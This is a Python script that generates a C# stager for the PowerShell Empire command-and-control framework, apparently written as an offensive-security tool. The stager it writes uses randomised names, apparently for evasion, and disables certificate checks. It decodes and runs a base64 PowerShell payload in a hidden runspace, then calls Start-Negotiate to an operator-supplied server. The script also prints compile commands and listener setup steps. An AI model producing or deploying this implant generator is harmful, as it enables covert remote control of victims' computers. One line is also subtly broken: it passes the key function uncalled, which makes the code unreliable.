import sys
import argparse
import random

DEBUG = False

def opening_banner():
    ret = '''
            ,ooo888888888888888oooo,
          o8888YYYYYY77iiiiooo8888888o
         8888YYYY77iiYY8888888888888888
        [88YYY77iiY88888888888888888888]
        88YY7iYY888888888888888888888888
       [88YYi 88888888888888888888888888]
       i88Yo8888888888888888888888888888i
       i]        ^^^88888888^^^     o  [i
      oi8  i           o8o          i  8io
    ,77788o ^^  ,oooo8888888ooo,   ^ o88777,
    7777788888888888888888888888888888877777
     77777888888888888888888888888888877777
      77777788888888^7777777^8888888777777
      88888778888^7777ooooo7777^8887788888
     88888888888888888888888888888888888887
      78888887788788888^;;^888878877888887
       7888878^ ^8788^;;;;;;^878^ ^878877
         777888o8888^;ii;;ii;^888o87777'''
    ret += "\n\n"
    return ret
    
def finish_csc():
    # ` is for multi line PS commands, ^ for cmd.exe
    ret = """
[*] On Windows To Compile:
--------------------------
C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe `
/r:C:\\Windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll `
/res:ModifyMe.rc /out:"{0}.exe" /platform:x86 "{0}.cs"
"""
    return ret

def finish_emp():
    ret ="""
[*] On Your Empire Host Run:
----------------------------
listeners
uselistener http
set Host {0}
etc..
etc...
etc...."""
    return ret

def SharpRC():
    ret = '''
using System.Reflection;

[assembly: AssemblyTitle("NativeEmpire")]
[assembly: AssemblyKeyFile("")]
[assembly: AssemblyDescription("Publisher and Author: AliensOMG!")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("")]
[assembly: AssemblyProduct("NativeEmpire")]
[assembly: AssemblyCopyright("Copyright 2017")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]
[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]'''
    return ret

def rand_str():
    ascii = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    rng = random.randrange(10,15)
    ret = ''.join(random.choice(ascii) for x in range(rng))
    return ret

def emp_key(): # empire key is 32 lower ascii and num
    asciinum = 'abcdefghijklmnopqrstuvwxyz123456789'
    ret = ''.join(random.choice(asciinum) for x in range(32))
    return ret

def random_names(mod_name = ""):
    ret = rand_str()
    if DEBUG and mod_name != "": ret = mod_name
    return ret

def write_file(fname, data):
    o = open(fname, "w")
    o.write(data)
    o.close()

def setupCSfile():
    TheMoneyShot = "AAAABBBBCCCCDDDDEEEEFFFF"
    NamespaceName                 = random_names("NamespaceName")
    ClassName                     = random_names("ClassName")
    RunPSName                     = random_names("RunPSName")
    CommandString                 = random_names("CommandString")
    RunspaceName                  = random_names("RunspaceName")
    ScriptInvoker                 = random_names("ScriptInvoker")
    PipelineName                  = random_names("PipelineName")
    ResultsName                   = random_names("ResultsName")
    String64                      = random_names("String64")
    NewString64                   = random_names("NewString64")
    SecString  =  emp_key
    ret = "namespace %s\n{\n" % NamespaceName
    ret += " class %s\n {\n" % ClassName
    ret += "  static void %s(string %s)\n  {\n" % (RunPSName, CommandString)
    ret += "   System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };\n"
    ret += "   System.Management.Automation.Runspaces.Runspace %s = System.Management.Automation.Runspaces.RunspaceFactory.CreateRunspace();\n" % RunspaceName
    ret += "   %s.Open();" % RunspaceName
    ret += "   System.Management.Automation.RunspaceInvoke %s = new System.Management.Automation.RunspaceInvoke(%s);\n" % (ScriptInvoker, RunspaceName)
    ret += "   System.Management.Automation.Runspaces.Pipeline %s = %s.CreatePipeline();\n" %(PipelineName, RunspaceName)
    ret += "   %s.Commands.AddScript(%s);\n" % (PipelineName, CommandString)
    ret += "   %s.Commands.Add(\"Out-String\");\n" % PipelineName
    ret += "   System.Collections.ObjectModel.Collection<System.Management.Automation.PSObject> %s = %s.Invoke();\n" % (ResultsName, PipelineName)
    ret += "   %s.Close();\n  }\n" % PipelineName
    ret += "  static void Main()\n  {\n"
    ret += "   string %s = \"%s\";\n" % (String64, TheMoneyShot)
    ret += "   string %s = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(%s));\n" % (NewString64, String64)
    ret += "   %s += \"Start-Negotiate -s '%s' -SK '%s'\";\n" % (NewString64, IPANDPORTURL, SecString)
    ret += "   %s(%s);\n" %(RunPSName, NewString64)
    ret += "  }\n }\n}\n"
    return ret

if __name__ == '__main__':
    # print(opening_banner())
    usage_text = "%s http(s):\\<url>:<port> <output_file>\n" % (sys.argv[0])
    parser = argparse.ArgumentParser(usage=usage_text)
    if len(sys.argv) < 3:
        parser.print_help()
        sys.exit(0)
    IPANDPORTURL       = sys.argv[1]
    output_file        = sys.argv[2]
    payload = setupCSfile()
    write_file(output_file, payload)
    write_file("ModifyMe.rc", SharpRC())
    print(finish_csc().format(output_file.split('.')[0]))
    print(finish_emp())
